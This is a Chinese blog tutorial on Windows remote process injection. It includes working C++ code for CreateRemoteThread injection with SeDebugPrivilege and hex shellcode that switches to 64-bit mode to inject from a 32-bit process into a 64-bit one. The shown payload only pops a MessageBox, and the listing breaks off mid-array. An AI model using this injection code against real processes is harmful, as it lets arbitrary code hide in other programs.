---
title: 32->64注入shellcode
tags: [安全技术]
index_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/timg.jpg
banner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/timg.jpg
---

## 远进程注入

[注入参考——必看](https://www.cnblogs.com/uAreKongqi/p/6012353.html)

### 32位->32位 

核心思路如下

- 根据进程ID打开进程，获得进程句柄
- 申请内存空间
- 写入数据
- 将内存改为可读可执行(可选)
- 创建线程
- 等待线程退出(可选)

**使用到的API**

- OpenProcess
- VirtualAllocEx
- WriteProcessMemory
- VirtualProtectEx
- CreateRemoteThread
- WaitForSingleObject

注入模板网上都有。这里贴一下注入函数且带有参数的写法

```c++
#pragma once  
#include <windows.h>  
#include <TlHelp32.h>  
#include "stdio.h"

typedef struct _RemoteParam {
	char szMsg[12];    //MessageBox函数中显示的字符提示  
	DWORD dwMessageBox;//MessageBox函数的入口地址  
} RemoteParam, * PRemoteParam;

//定义MessageBox类型的函数指针  
typedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);

DWORD __stdcall threadProc(LPVOID lParam)
{
	RemoteParam* pRP = (RemoteParam*)lParam;
	PFN_MESSAGEBOX pfnMessageBox;
	pfnMessageBox = (PFN_MESSAGEBOX)pRP->dwMessageBox;
	pfnMessageBox(NULL, pRP->szMsg, pRP->szMsg, 0);
	return 0;
}

bool enableDebugPriv()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		return false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		CloseHandle(hToken);
		return false;
	}
	return true;
}

HANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapshot, &pe)) {
		MessageBoxA(NULL,
			"The frist entry of the process list has not been copyied to the buffer",
			"Notice", MB_ICONINFORMATION | MB_OK);
		return 0;
	}
	while (Process32Next(hSnapshot, &pe)) {
		if (!lstrcmpW(lpszProcessName, pe.szExeFile)) {
			return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
		}
	}
	return 0;
}

int _main()
{
	const DWORD dwThreadSize = 4096;
	DWORD dwWriteBytes = 0;
	enableDebugPriv();
	HANDLE TargetProc = GetProcessHandleByName(L"CheckVm.exe");
	if (!TargetProc)
	{
		MessageBoxA(NULL,
			"Open target process failed !",
			"Notice", MB_ICONINFORMATION | MB_OK);
		return 0;
	}

	//在宿主进程中为线程体开辟一块存储区域  
	//在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  
	//其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  
	void* pRemoteThread = VirtualAllocEx(TargetProc, 0,
		dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteThread) {
		MessageBoxA(NULL, "Alloc memory in target process failed !",
			"notice", MB_ICONINFORMATION | MB_OK);
		return 0;
	}

	//将线程体拷贝到宿主进程中  
	if (!WriteProcessMemory(TargetProc,
		pRemoteThread, &threadProc, dwThreadSize, 0)) {
		MessageBoxA(NULL, "Write data to target process failed !",
			"Notice", MB_ICONINFORMATION | MB_OK);
		return 0;
	}
	//定义线程参数结构体变量  
	RemoteParam remoteData;
	ZeroMemory(&remoteData, sizeof(RemoteParam));

	//填充结构体变量中的成员  
	HINSTANCE hUser32 = LoadLibrary(L"User32.dll");
	remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, "MessageBoxA");
	strcat_s(remoteData.szMsg, "Hello＼0");

	//为线程参数在宿主进程中开辟存储区域  
	RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(
		TargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);

	if (!pRemoteParam) {
		MessageBoxA(NULL, "Alloc memory failed !",
			"Notice", MB_ICONINFORMATION | MB_OK);
		return 0;
	}
	//将线程参数拷贝到宿主进程地址空间中  
	if (!WriteProcessMemory(TargetProc,
		pRemoteParam, &remoteData, sizeof(remoteData), 0)) {
		MessageBoxA(NULL, "Write data to target process failed !",
			"Notice", MB_ICONINFORMATION | MB_OK);
		return 0;
	}

	//在宿主进程中创建线程  
	HANDLE hRemoteThread = CreateRemoteThread(
		TargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,
		pRemoteParam, 0, &dwWriteBytes);
	if (!hRemoteThread) {
		MessageBoxA(NULL, "Create remote thread failed !", "Notice", MB_ICONINFORMATION | MB_OK);
		return 0;
	}
	CloseHandle(hRemoteThread);
	FreeLibrary(hUser32);
	return 0;
}
```



### 32位->64位



核心思路如下

- 根据进程ID打开进程，获得进程句柄
- 申请内存空间
- 写入数据
- 将内存改为可读可执行(可选)
- 创建线程
- 等待线程退出(可选)

**使用到的API**

- OpenProcess
- VirtualAllocEx
- WriteProcessMemory
- VirtualProtectEx
- **CreateRemoteThread64**
- WaitForSingleObject

32位去注入64位进程时`CreateRemoteThread`会调用失败，需要使用64位的接口

先提升到64位汇编，在遍历ntdll.dll中的导出函数 `CreateRemoteThread`



## 笔记

[32位注入64位参考](https://www.cnblogs.com/HsinTsao/p/7270732.html)

3g大佬代码代码有点问题，有点误导

获取64位代码是32位的汇编，他写的64位的结果，实则是通过遍历ntdll64里面的64位API 实现的

>  在x64系统下的进程是有32位和64位两种工作模式，这两种工作模式的区别在于CS寄存器。32位模式时，**CS = 0x23**；64位模式时，**CS = 0x33**。
>
> 这两种工作模式是可以进行切换的，一般会通过retf指令，一条retf指令等效于以下2条汇编指令
>
> `pop ip`
>
> `pop cs`



代码中`CREATETHREADPIC`shellcode是用来得到64位的`CreateRemoteThread`

`EXECPIC`是我通过vs生成的谈拆管理shellcode，可疑调整为任意代码

```c++
#pragma once  
#include <windows.h>  
#include <TlHelp32.h>  
#include <iostream>
using namespace std;

#define CREATETHREADPIC_SIZE 271
char CREATETHREADPIC[] = {
	/* 0000 */ "\x53"                             /* push ebx                    */
	/* 0001 */ "\x56"                             /* push esi                    */
	/* 0002 */ "\x57"                             /* push edi                    */
	/* 0003 */ "\x55"                             /* push ebp                    */
	/* 0004 */ "\xe8\x6c\x00\x00\x00"             /* call 0x75                   */
	/* 0009 */ "\x85\xc0"                         /* test eax, eax               */
	/* 000B */ "\x74\x5d"                         /* jz 0x6a                     */
	/* 000D */ "\x48\x89\xe6"                     /* mov rsi, rsp                */
	/* 0010 */ "\x48\x83\xe4\xf0"                 /* and rsp, 0xfffffffffffffff0 */
	/* 0014 */ "\x48\x83\xec\x68"                 /* sub rsp, 0x68               */
	/* 0018 */ "\xb8\xfa\x80\x39\x5e"             /* mov eax, 0x5e3980fa         */
	/* 001D */ "\xe8\x78\x00\x00\x00"             /* call 0x9a                   */
	/* 0022 */ "\x48\x89\xc3"                     /* mov rbx, rax                */
	/* 0025 */ "\x4d\x31\xc0"                     /* xor r8, r8                  */
	/* 0028 */ "\x48\x31\xc0"                     /* xor rax, rax                */
	/* 002B */ "\x48\x89\x44\x24\x50"             /* mov [rsp+0x50], rax         */
	/* 0030 */ "\x48\x89\x44\x24\x48"             /* mov [rsp+0x48], rax         */
	/* 0035 */ "\x48\x89\x44\x24\x40"             /* mov [rsp+0x40], rax         */
	/* 003A */ "\x48\x89\x44\x24\x38"             /* mov [rsp+0x38], rax         */
	/* 003F */ "\x48\x89\x44\x24\x30"             /* mov [rsp+0x30], rax         */
	/* 0044 */ "\x8b\x46\x24"                     /* mov eax, [rsi+0x24]         */
	/* 0047 */ "\x48\x89\x44\x24\x28"             /* mov [rsp+0x28], rax         */
	/* 004C */ "\x8b\x46\x20"                     /* mov eax, [rsi+0x20]         */
	/* 004F */ "\x48\x89\x44\x24\x20"             /* mov [rsp+0x20], rax         */
	/* 0054 */ "\x44\x8b\x4e\x14"                 /* mov r9d, [rsi+0x14]         */
	/* 0058 */ "\xba\x00\x00\x00\x10"             /* mov edx, 0x10000000         */
	/* 005D */ "\x8b\x4e\x30"                     /* mov ecx, [rsi+0x30]         */
	/* 0060 */ "\xff\xd3"                         /* call rbx                    */
	/* 0062 */ "\x48\x89\xf4"                     /* mov rsp, rsi                */
	/* 0065 */ "\xe8\x18\x00\x00\x00"             /* call 0x82                   */
	/* 006A */ "\x5d"                             /* pop rbp                     */
	/* 006B */ "\x5f"                             /* pop rdi                     */
	/* 006C */ "\x5e"                             /* pop rsi                     */
	/* 006D */ "\x5b"                             /* pop rbx                     */
	/* 006E */ "\xc3"                             /* ret                         */
	/* 006F */ "\x31\xc0"                         /* xor eax, eax                */
	/* 0071 */ "\x48\xf7\xd8"                     /* neg eax                     */
	/* 0074 */ "\xc3"                             /* ret                         */
	/* 0075 */ "\xe8\xf5\xff\xff\xff"             /* call 0x6f                   */
	/* 007A */ "\x74\x05"                         /* jz 0x81                     */
	/* 007C */ "\x58"                             /* pop eax                     */
	/* 007D */ "\x6a\x33"                         /* push 0x33                   */ //将cs修改为0x33
	/* 007F */ "\x50"                             /* push eax                    */ //也就能执行64位汇编了
	/* 0080 */ "\xcb"                             /* retf                        */
	/* 0081 */ "\xc3"                             /* ret                         */
	/* 0082 */ "\xe8\xe8\xff\xff\xff"             /* call 0x6f                   */
	/* 0087 */ "\x75\x10"                         /* jnz 0x99                    */
	/* 0089 */ "\x58"                             /* pop rax                     */
	/* 008A */ "\x83\xec\x08"                     /* sub esp, 0x8                */
	/* 008D */ "\x89\x04\x24"                     /* mov [rsp], eax              */
	/* 0090 */ "\xc7\x44\x24\x04\x23\x00\x00\x00" /* mov dword [rsp+0x4], 0x23   */
	/* 0098 */ "\xcb"                             /* retf                        */
	/* 0099 */ "\xc3"                             /* ret                         */
	/* 009A */ "\x56"                             /* push rsi                    */
	/* 009B */ "\x57"                             /* push rdi                    */
	/* 009C */ "\x53"                             /* push rbx                    */
	/* 009D */ "\x51"                             /* push rcx                    */
	/* 009E */ "\x49\x89\xc0"                     /* mov r8, rax                 */
	/* 00A1 */ "\x6a\x60"                         /* push 0x60                   */
	/* 00A3 */ "\x5e"                             /* pop rsi                     */
	/* 00A4 */ "\x65\x48\x8b\x06"                 /* mov rax, [gs:rsi]           */
	/* 00A8 */ "\x48\x8b\x40\x18"                 /* mov rax, [rax+0x18]         */
	/* 00AC */ "\x4c\x8b\x50\x30"                 /* mov r10, [rax+0x30]         */
	/* 00B0 */ "\x49\x8b\x6a\x10"                 /* mov rbp, [r10+0x10]         */
	/* 00B4 */ "\x48\x85\xed"                     /* test rbp, rbp               */
	/* 00B7 */ "\x89\xe8"                         /* mov eax, ebp                */
	/* 00B9 */ "\x74\x4f"                         /* jz 0x10a                    */
	/* 00BB */ "\x4d\x8b\x12"                     /* mov r10, [r10]              */
	/* 00BE */ "\x8b\x45\x3c"                     /* mov eax, [rbp+0x3c]         */
	/* 00C1 */ "\x83\xc0\x10"                     /* add eax, 0x10               */
	/* 00C4 */ "\x8b\x44\x05\x78"                 /* mov eax, [rbp+rax+0x78]     */
	/* 00C8 */ "\x48\x8d\x74\x05\x18"             /* lea rsi, [rbp+rax+0x18]     */
	/* 00CD */ "\xad"                             /* lodsd                       */
	/* 00CE */ "\x91"                             /* xchg ecx, eax               */
	/* 00CF */ "\x67\xe3\xde"                     /* jecxz 0xb0                  */
	/* 00D2 */ "\xad"                             /* lodsd                       */
	/* 00D3 */ "\x4c\x8d\x5c\x05\x00"             /* lea r11, [rbp+rax]          */
	/* 00D8 */ "\xad"                             /* lodsd                       */
	/* 00D9 */ "\x48\x8d\x7c\x05\x00"             /* lea rdi, [rbp+rax]          */
	/* 00DE */ "\xad"                             /* lodsd                       */
	/* 00DF */ "\x48\x8d\x5c\x05\x00"             /* lea rbx, [rbp+rax]          */
	/* 00E4 */ "\x8b\x74\x8f\xfc"                 /* mov esi, [rdi+rcx*4-0x4]    */
	/* 00E8 */ "\x48\x01\xee"                     /* add rsi, rbp                */
	/* 00EB */ "\x31\xc0"                         /* xor eax, eax                */
	/* 00ED */ "\x99"                             /* cdq                         */
	/* 00EE */ "\xac"                             /* lodsb                       */
	/* 00EF */ "\x01\xc2"                         /* add edx, eax                */
	/* 00F1 */ "\xc1\xc2\x05"                     /* rol edx, 0x5                */
	/* 00F4 */ "\xff\xc8"                         /* dec eax                     */
	/* 00F6 */ "\x79\xf6"                         /* jns 0xee                    */
	/* 00F8 */ "\x44\x39\xc2"                     /* cmp edx, r8d                */
	/* 00FB */ "\xe0\xe7"                         /* loopne 0xe4                 */
	/* 00FD */ "\x75\xb1"                         /* jnz 0xb0                    */
	/* 00FF */ "\x0f\xb7\x14\x4b"                 /* movzx edx, word [rbx+rcx*2] */
	/* 0103 */ "\x41\x8b\x04\x93"                 /* mov eax, [r11+rdx*4]        */
	/* 0107 */ "\x48\x01\xe8"                     /* add rax, rbp                */
	/* 010A */ "\x59"                             /* pop rcx                     */
	/* 010B */ "\x5b"                             /* pop rbx                     */
	/* 010C */ "\x5f"                             /* pop rdi                     */
	/* 010D */ "\x5e"                             /* pop rsi                     */
	/* 010E */ "\xc3"                             /* ret                         */
};
#define EXECPIC_SIZE 1984
char EXECPIC[] = {
	/* 0000 */ "\x48\x81\xec\xd8\x00\x00\x00"                     /* sub rsp, 0xd8                            */
	/* 0007 */ "\x48\xc7\x44\x24\x78\x00\x00\x00\x00"             /* mov qword [rsp+0x78], 0x0                */
	/* 0010 */ "\x48\xc7\x84\x24\x80\x00\x00\x00\x00\x00\x00\x00" /* mov qword [rsp+0x80], 0x0                */
	/* 001C */ "\x48\xc7\x84\x24\xa8\x00\x00\x00\x00\x00\x00\x00" /* mov qword [rsp+0xa8], 0x0                */
	/* 0028 */ "\xb8\x75\x00\x00\x00"                             /* mov eax, 0x75                            */
	/* 002D */ "\x66\x89\x44\x24\x58"                             /* mov [rsp+0x58], ax                       */
	/* 0032 */ "\xb8\x73\x00\x00\x00"                             /* mov eax, 0x73                            */
	/* 0037 */ "\x66\x89\x44\x24\x5a"                             /* mov [rsp+0x5a], ax                       */
	/* 003C */ "\xb8\x65\x00\x00\x00"                             /* mov eax, 0x65                            */
	/* 0041 */ "\x66\x89\x44\x24\x5c"                             /* mov [rsp+0x5c], ax                       */
	/* 0046 */ "\xb8\x72\x00\x00\x00"                             /* mov eax, 0x72                            */
	/* 004B */ "\x66\x89\x44\x24\x5e"                             /* mov [rsp+0x5e], ax                       */
	/* 0050 */ "\xb8\x33\x00\x00\x00"                             /* mov eax, 0x33                            */
	/* 0055 */ "\x66\x89\x44\x24\x60"                             /* mov [rsp+0x60], ax                       */
	/* 005A */ "\xb8\x32\x00\x00\x00"                             /* mov eax, 0x32                            */
	/* 005F */ "\x66\x89\x44\x24\x62"                             /* mov [rsp+0x62], ax                       */
	/* 0064 */ "\xb8\x2e\x00\x00\x00"                             /* mov eax, 0x2e                            */
	/* 0069 */ "\x66\x89\x44\x24\x64"                             /* mov [rsp+0x64], ax                       */
	/* 006E */ "\xb8\x64\x00\x00\x00"                             /* mov eax, 0x64                            */
	/* 0073 */ "\x66\x89\x44\x24\x66"                             /* mov [rsp+0x66], ax                       */
	/* 0078 */ "\xb8\x6c\x00\x00\x00"                             /* mov eax, 0x6c                            */
	/* 007D */ "\x66\x89\x44\x24\x68"                             /* mov [rsp+0x68], ax                       */
	/* 0082 */ "\xb8\x6c\x00\x00\x00"                             /* mov eax, 0x6c                            */
	/* 0087 */ "\x66\x89\x44\x24\x6a"                             /* mov [rsp+0x6a], ax                       */
	/* 008C */ "\x33\xc0"                                         /* xor eax, eax                             */
	/* 008E */ "\x66\x89\x44\x24\x6c"                             /* mov [rsp+0x6c], ax                       */
	/* 0093 */ "\xc6\x44\x24\x30\x4d"                             /* mov byte [rsp+0x30], 0x4d                */
	/* 0098 */ "\xc6\x44\x24\x31\x65"                             /* mov byte [rsp+0x31], 0x65                */
	/* 009D */ "\xc6\x44\x24\x32\x73"                             /* mov byte [rsp+0x32], 0x73                */
	/* 00A2 */ "\xc6\x44\x24\x33\x73"                             /* mov byte [rsp+0x33], 0x73                */
	/* 00A7 */ "\xc6\x44\x24\x34\x61"                             /* mov byte [rsp+0x34], 0x61                */
	/* 00AC */ "\xc6\x44\x24\x35\x67"                             /* mov byte [rsp+0x35], 0x67                */
	/* 00B1 */ "\xc6\x44\x24\x36\x65"                             /* mov byte [rsp+0x36], 0x65                */
	/* 00B6 */ "\xc6\x44\x24\x37\x42"                             /* mov byte [rsp+0x37], 0x42                */
	/* 00BB */ "\xc6\x44\x24\x38\x6f"                             /* mov byte [rsp+0x38], 0x6f                */
	/* 00C0 */ "\xc6\x44\x24\x39\x78"                             /* mov byte [rsp+0x39], 0x78                */
	/* 00C5 */ "\xc6\x44\x24\x3a\x41"                             /* mov byte [rsp+0x3a], 0x41                */
	/* 00CA */ "\xc6\x44\x24\x3b\x00"                             /* mov byte [rsp+0x3b], 0x0                 */
	/* 00CF */ "\xc6\x44\x24\x40\x48"                             /* mov byte [rsp+0x40], 0x48                */
	/* 00D4 */ "\xc6\x44\x24\x41\x65"                             /* mov byte [rsp+0x41], 0x65                */
	/* 00D9 */ "\xc6\x44\x24\x42\x6c"                             /* mov byte [rsp+0x42], 0x6c                */
	/* 00DE */ "\xc6\x44\x24\x43\x6c"                             /* mov byte [rsp+0x43], 0x6c                */
	/* 00E3 */ "\xc6\x44\x24\x44\x6f"                             /* mov byte [rsp+0x44], 0x6f                */
	/* 00E8 */ "\xc6\x44\x24\x45\x2e"                             /* mov byte [rsp+0x45], 0x2e                */
	/* 00ED */ "\xc6\x44\x24\x46\x57"                             /* mov byte [rsp+0x46], 0x57                */
	/* 00F2 */ "\xc6\x44\x24\x47\x6f"                             /* mov byte [rsp+0x47], 0x6f                */
	/* 00F7 */ "\xc6\x44\x24\x48\x6c"                             /* mov byte [rsp+0x48], 0x6c                */
	/* 00FC */ "\xc6\x44\x24\x49\x72"                             /* mov byte [rsp+0x49], 0x72                */
	/* 0101 */ "\xc6\x44\x24\x4a\x64"                             /* mov byte [rsp+0x4a], 0x64                */
	/* 0106 */ "\xc6\x44\x24\x4b\x21"                             /* mov byte [rsp+0x4b], 0x21                */
	/* 010B */ "\xc6\x44\x24\x4c\x00"                             /* mov byte [rsp+0x4c], 0x0                 */
	/* 0110 */ "\xe8\x3b\x05\x00\x00"                             /* call 0x650                               */
	/* 0115 */ "\x48\x89\x84\x24\x88\x00\x00\x00"                 /* mov [rsp+0x88], rax                      */
	/* 011D */ "\x48\x83\xbc\x24\x88\x00\x00\x00\xff"             /* cmp qword [rsp+0x88], 0xffffffffffffffff */
	/* 0126 */ "\x75\x05"                                         /* jnz 0x12d                                */
	/* 0128 */ "\xe9\xd9\x01\x00\x00"                             /* jmp 0x306                                */
	/* 012D */ "\x48\x8b\x84\x24\x88\x00\x00\x00"                 /* mov rax, [rsp+0x88]                      */
	/* 0135 */ "\x48\x89\x44\x24\x28"                             /* mov [rsp+0x28], rax                      */
	/* 013A */ "\x48\x8b\x44\x24\x28"                             /* mov rax, [rsp+0x28]                      */
	/* 013F */ "\x48\x89\x84\x24\xb0\x00\x00\x00"                 /* mov [rsp+0xb0], rax                      */
	/* 0147 */ "\x48\x8b\x84\x24\xb0\x00\x00\x00"                 /* mov rax, [rsp+0xb0]                      */
	/* 014F */ "\x48\x63\x40\x3c"                                 /* movsxd rax, dword [rax+0x3c]             */
	/* 0153 */ "\x48\x8b\x4c\x24\x28"                             /* mov rcx, [rsp+0x28]                      */
	/* 0158 */ "\x48\x03\xc8"                                     /* add rcx, rax                             */
	/* 015B */ "\x48\x8b\xc1"                                     /* mov rax, rcx                             */
	/* 015E */ "\x48\x89\x84\x24\xb8\x00\x00\x00"                 /* mov [rsp+0xb8], rax                      */
	/* 0166 */ "\xb8\x08\x00\x00\x00"                             /* mov eax, 0x8                             */
	/* 016B */ "\x48\x6b\xc0\x00"                                 /* imul rax, rax, 0x0                       */
	/* 016F */ "\x48\x8b\x8c\x24\xb8\x00\x00\x00"                 /* mov rcx, [rsp+0xb8]                      */
	/* 0177 */ "\x8b\x84\x01\x88\x00\x00\x00"                     /* mov eax, [rcx+rax+0x88]                  */
	/* 017E */ "\x48\x8b\x4c\x24\x28"                             /* mov rcx, [rsp+0x28]                      */
	/* 0183 */ "\x48\x03\xc8"                                     /* add rcx, rax                             */
	/* 0186 */ "\x48\x8b\xc1"                                     /* mov rax, rcx                             */
	/* 0189 */ "\x48\x89\x44\x24\x50"                             /* mov [rsp+0x50], rax                      */
	/* 018E */ "\x48\x8b\x44\x24\x50"                             /* mov rax, [rsp+0x50]                      */
	/* 0193 */ "\x8b\x40\x20"                                     /* mov eax, [rax+0x20]                      */
	/* 0196 */ "\x48\x8b\x4c\x24\x28"                             /* mov rcx, [rsp+0x28]                      */
	/* 019B */ "\x48\x03\xc8"                                     /* add rcx, rax                             */
	/* 019E */ "\x48\x8b\xc1"                                     /* mov rax, rcx                             */
	/* 01A1 */ "\x48\x89\x84\x24\xc0\x00\x00\x00"                 /* mov [rsp+0xc0], rax                      */
	/* 01A9 */ "\x48\x8b\x44\x24\x50"                             /* mov rax, [rsp+0x50]                      */
	/* 01AE */ "\x8b\x40\x1c"                                     /* mov eax, [rax+0x1c]                      */
	/* 01B1 */ "\x48\x8b\x4c\x24\x28"                             /* mov rcx, [rsp+0x28]                      */
	/* 01B6 */ "\x48\x03\xc8"                                     /* add rcx, rax                             */
	/* 01B9 */ "\x48\x8b\xc1"                                     /* mov rax, rcx                             */
	/* 01BC */ "\x48\x89\x84\x24\xa0\x00\x00\x00"                 /* mov [rsp+0xa0], rax                      */
	/* 01C4 */ "\x48\x8b\x44\x24\x50"                             /* mov rax, [rsp+0x50]                      */
	/* 01C9 */ "\x8b\x40\x24"                                     /* mov eax, [rax+0x24]                      */
	/* 01CC */ "\x48\x8b\x4c\x24\x28"                             /* mov rcx, [rsp+0x28]                      */
	/* 01D1 */ "\x48\x03\xc8"                                     /* add rcx, rax                             */
	/* 01D4 */ "\x48\x8b\xc1"                                     /* mov rax, rcx                             */
	/* 01D7 */ "\x48\x89\x84\x24\x98\x00\x00\x00"                 /* mov [rsp+0x98], rax                      */
	/* 01DF */ "\xc7\x44\x24\x74\x88\xef\xff\x6f"                 /* mov dword [rsp+0x74], 0x6fffef88         */
	/* 01E7 */ "\xc7\x44\x24\x70\x7e\xaa\x8a\x3f"                 /* mov dword [rsp+0x70], 0x3f8aaa7e         */
	/* 01EF */ "\xc7\x44\x24\x20\x00\x00\x00\x00"                 /* mov dword [rsp+0x20], 0x0                */
	/* 01F7 */ "\xeb\x0a"                                         /* jmp 0x203                                */
	/* 01F9 */ "\x8b\x44\x24\x20"                                 /* mov eax, [rsp+0x20]                      */
	/* 01FD */ "\xff\xc0"                                         /* inc eax                                  */
	/* 01FF */ "\x89\x44\x24\x20"                                 /* mov [rsp+0x20], eax                      */
	/* 0203 */ "\x48\x8b\x44\x24\x50"                             /* mov rax, [rsp+0x50]                      */
	/* 0208 */ "\x8b\x40\x18"                                     /* mov eax, [rax+0x18]                      */
	/* 020B */ "\x39\x44\x24\x20"                                 /* cmp [rsp+0x20], eax                      */
	/* 020F */ "\x0f\x83\xf1\x00\x00\x00"                         /* jae 0x306                                */
	/* 0215 */ "\x8b\x44\x24\x20"                                 /* mov eax, [rsp+0x20]                      */
	/* 0219 */ "\x48\x8b\x8c\x24\xc0\x00\x00\x00"                 /* mov rcx, [rsp+0xc0]                      */
	/* 0221 */ "\x8b\x04\x81"                                     /* mov eax, [rcx+rax*4]                     */
	/* 0224 */ "\x48\x8b\x4c\x24\x28"                             /* mov rcx, [rsp+0x28]                      */
	/* 0229 */ "\x48\x03\xc8"                                     /* add rcx, rax                             */
	/* 022C */ "\x48\x8b\xc1"                                     /* mov rax, rcx                             */
	/* 022F */ "\x48\x89\x84\x24\x90\x00\x00\x00"                 /* mov [rsp+0x90], rax                      */
	/* 0237 */ "\x48\x8b\x8c\x24\x90\x00\x00\x00"                 /* mov rcx, [rsp+0x90]                      */
	/* 023F */ "\xe8\xac\x03\x00\x00"                             /* call 0x5f0                               */
	/* 0244 */ "\x3b\x44\x24\x70"                                 /* cmp eax, [rsp+0x70]                      */
	/* 0248 */ "\x75\x30"                                         /* jnz 0x27a                                */
	/* 024A */ "\x8b\x44\x24\x20"                                 /* mov eax, [rsp+0x20]                      */
	/* 024E */ "\x48\x8b\x8c\x24\x98\x00\x00\x00"                 /* mov rcx, [rsp+0x98]                      */
	/* 0256 */ "\x0f\xb7\x04\x41"                                 /* movzx eax, word [rcx+rax*2]              */
	/* 025A */ "\x48\x8b\x8c\x24\xa0\x00\x00\x00"                 /* mov rcx, [rsp+0xa0]                      */
	/* 0262 */ "\x8b\x04\x81"                                     /* mov eax, [rcx+rax*4]                     */
	/* 0265 */ "\x48\x8b\x4c\x24\x28"                             /* mov rcx, [rsp+0x28]                      */
	/* 026A */ "\x48\x03\xc8"                                     /* add rcx, rax                             */
	/* 026D */ "\x48\x8b\xc1"                                     /* mov rax, rcx                             */
	/* 0270 */ "\x48\x89\x84\x24\x80\x00\x00\x00"                 /* mov [rsp+0x80], rax                      */
	/* 0278 */ "\xeb\x3e"                                         /* jmp 0x2b8                                */
	/* 027A */ "\x48\x8b\x8c\x24\x90\x00\x00\x00"                 /* mov rcx, [rsp+0x90]                      */
	/* 0282 */ "\xe8\x69\x03\x00\x00"                             /* call 0x5f0                               */
	/* 0287 */ "\x3b\x44\x24\x74"                                 /* cmp eax, [rsp+0x74]                      */
	/* 028B */ "\x75\x2b"                                         /* jnz 0x2b8                                */
	/* 028D */ "\x8b\x44\x24\x20"                                 /* mov eax, [rsp+0x20]                      */
	/* 0291 */ "\x48\x8b\x8c\x24\x98\x00\x00\x00"                 /* mov rcx, [rsp+0x98]                      */
	/* 0299 */ "\x0f\xb7\x04\x41"                                 /* movzx eax, word [rcx+rax*2]              */
	/* 029D */ "\x48\x8b\x8c\x24\xa0\x00\x00\x00"                 /* mov rcx, [rsp+0xa0]                      */
	/* 02A5 */ "\x8b\x04\x81"                                     /* mov eax, [rcx+rax*4]                     */
	/* 02A8 */ "\x48\x8b\x4c\x24\x28"                             /* mov rcx, [rsp+0x28]                      */
	/* 02AD */ "\x48\x03\xc8"                                     /* add rcx, rax                             */
	/* 02B0 */ "\x48\x8b\xc1"                                     /* mov rax, rcx                             */
	/* 02B3 */ "\x48\x89\x44\x24\x78"                             /* mov [rsp+0x78], rax                      */
	/* 02B8 */ "\x48\x83\xbc\x24\x80\x00\x00\x00\x00"             /* cmp qword [rsp+0x80], 0x0                */
	/* 02C1 */ "\x74\x3e"                                         /* jz 0x301                                 */
	/* 02C3 */ "\x48\x83\x7c\x24\x78\x00"                         /* cmp qword [rsp+0x78], 0x0                */
	/* 02C9 */ "\x74\x36"                                         /* jz 0x301                                 */
	/* 02CB */ "\x48\x8d\x4c\x24\x58"                             /* lea rcx, [rsp+0x58]                      */
	/* 02D0 */ "\xff\x54\x24\x78"                                 /* call qword [rsp+0x78]                    */
	/* 02D4 */ "\x48\x8d\x54\x24\x30"                             /* lea rdx, [rsp+0x30]                      */
	/* 02D9 */ "\x48\x8b\xc8"                                     /* mov rcx, rax                             */
	/* 02DC */ "\xff\x94\x24\x80\x00\x00\x00"                     /* call qword [rsp+0x80]                    */
	/* 02E3 */ "\x48\x89\x84\x24\xa8\x00\x00\x00"                 /* mov [rsp+0xa8], rax                      */
	/* 02EB */ "\x45\x33\xc9"                                     /* xor r9d, r9d                             */
	/* 02EE */ "\x45\x33\xc0"                                     /* xor r8d, r8d                             */
	/* 02F1 */ "\x48\x8d\x54\x24\x40"                             /* lea rdx, [rsp+0x40]                      */
	/* 02F6 */ "\x33\xc9"                                         /* xor ecx, ecx                             */
	/* 02F8 */ "\xff\x94\x24\xa8\x00\x00\x00"                     /* call qword [rsp+0xa8]                    */
	/* 02FF */ "\xeb\x05"                                         /* jmp 0x306                                */
	/* 0301 */ "\xe9\xf3\xfe\xff\xff"                             /* jmp 0x1f9                                */
	/* 0306 */ "\x48\x81\xc4\xd8\x00\x00\x00"                     /* add rsp, 0xd8                            */
	/* 030D */ "\xc3"                                             /* ret                                      */
	/* 030E */ "\xcc"                                             /* int3                                     */
	/* 030F */ "\xcc"                                             /* int3                                     */
	/* 0310 */ "\x88\x4c\x24\x08"                                 /* mov [rsp+0x8], cl                        */
	/* 0314 */ "\x48\x83\xec\x18"                                 /* sub rsp, 0x18                            */
	/* 0318 */ "\x0f\xbe\x44\x24\x20"                             /* movsx eax, byte [rsp+0x20]               */
	/* 031D */ "\x83\xf8\x41"                                     /* cmp eax, 0x41                            */
	/* 0320 */ "\x7c\x13"                                         /* jl 0x335                                 */
	/* 0322 */ "\x0f\xbe\x44\x24\x20"                             /* movsx eax, byte [rsp+0x20]               */
	/* 0327 */ "\x83\xf8\x5a"                                     /* cmp eax, 0x5a                            */
	/* 032A */ "\x7f\x09"                                         /* jg 0x335                                 */
	/* 032C */ "\xc7\x04\x24\x01\x00\x00\x00"                     /* mov dword [rsp], 0x1                     */
	/* 0333 */ "\xeb\x07"                                         /* jmp 0x33c                                */
